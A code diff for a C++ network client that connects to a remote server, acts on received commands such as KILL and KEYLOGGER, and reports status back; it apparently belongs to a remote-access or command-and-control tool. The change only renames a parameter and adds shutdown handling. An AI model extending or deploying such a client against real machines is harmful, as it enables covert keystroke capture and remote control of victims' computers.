@@ -16,14 +16,14 @@ Client::Client(const char* __ip, const int __port): port_(__port), socket_(-1) {
     start();
 }
 
-void Client::send_out(Comm __comm) {
+void Client::send_out(Status __status) {
     char buf[OUT_SIZE];
     
     memcpy(buf, OUT_KEY, OUT_KEY_LEN);
     
     // Little endian format
-    buf[OUT_KEY_LEN] = static_cast<char>(__comm & 0XFF);
-    buf[OUT_KEY_LEN + 1] = static_cast<char>((__comm >> 8) & 0XFF);
+    buf[OUT_KEY_LEN] = static_cast<char>(__status & 0XFF);
+    buf[OUT_KEY_LEN + 1] = static_cast<char>((__status >> 8) & 0XFF);
     
     int rc = send(socket_, buf, OUT_SIZE, 0);
     if (rc < 0) {
@@ -104,6 +104,8 @@ void Client::start() {
                 case KILL:
                     printf("Received KILL command\n");
                     send_out(EXEC_SUCCESS);
+                    shutdown_flag_ = true;
+                    retry_flag_ = true;
                     break;
                 case KEYLOGGER:
                     printf("Received KEYLOGGER command\n");
@@ -115,11 +117,13 @@ void Client::start() {
             }
         }
         retry:
-            sleep(1);
-            if (socket_ >= 0) {
-                close(socket_);
+            if (!shutdown_flag_) {
+                sleep(1);
+                if (socket_ >= 0) {
+                    close(socket_);
+                }
+                continue;
             }
-            continue;
     }
 }
 
